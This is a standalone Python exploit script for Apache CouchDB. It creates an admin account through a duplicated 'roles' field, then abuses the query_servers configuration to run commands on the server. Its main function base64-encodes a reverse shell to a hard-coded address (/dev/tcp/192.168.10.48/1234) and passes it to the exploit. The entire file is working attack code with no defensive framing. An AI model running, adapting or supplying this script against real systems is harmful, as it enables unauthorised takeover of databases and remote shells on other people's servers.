#!/usr/bin/env python3
import click
import requests
import json
import base64
from requests.auth import HTTPBasicAuth

def exp(target,command):
    version = 1

    session = requests.session()
    session.headers = {
        'Content-Type': 'application/json'
    }
    session.put(target + '/_users/org.couchdb.user:test1', data='''{
      "type": "user",
      "name": "test1",
      "roles": ["_admin"],
      "roles": [],
      "password": "test1"
    }''')

    session.auth = HTTPBasicAuth('test1', 'test1')

    if version == 1:
        session.put(target + ('/_config/query_servers/cmd'), data=json.dumps(command))
    else:
        host = session.get(target + '/_membership').json()['all_nodes'][0]
        session.put(target + '/_node/{}/_config/query_servers/cmd'.format(host), data=json.dumps(command))

    session.put(target + '/test1')
    session.put(target + '/test1/test', data='{"_id": "test1test"}')

    if version == 1:
        session.post(target + '/test1/_temp_view?limit=10', data='{"language":"cmd","map":""}')
    else:
        session.put(target + '/test1/_design/test', data='{"_id":"_design/test","views":{"test1":{"map":""} },"language":"cmd"}')
@click.command()
@click.option("-i", help='Target ip', type=str)
@click.option("-p", help='Target port', type=str)
# @click.option("-c", help="Commands to be executed; ", type=str)
def main(i, p):
    res = requests.get('http://'+i+':'+p,verify=False)
    if res.status_code==200:
        url = 'http://'+i+':'+p
    else:url='https://'+i+':'+p
    cmd=rb"""sh -i >& /dev/tcp/192.168.10.48/1234 0>&1"""
    c="bash -c '{echo,%s}|{base64,-d}|{bash,-i}'" % base64.b64encode(cmd).decode()
    exp(url, c)
# bash -c {echo,c2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4xMC40OC8xMjM0IDA+JjE=}|{base64,-d}|{bash,-i}
if __name__ == "__main__":
    main()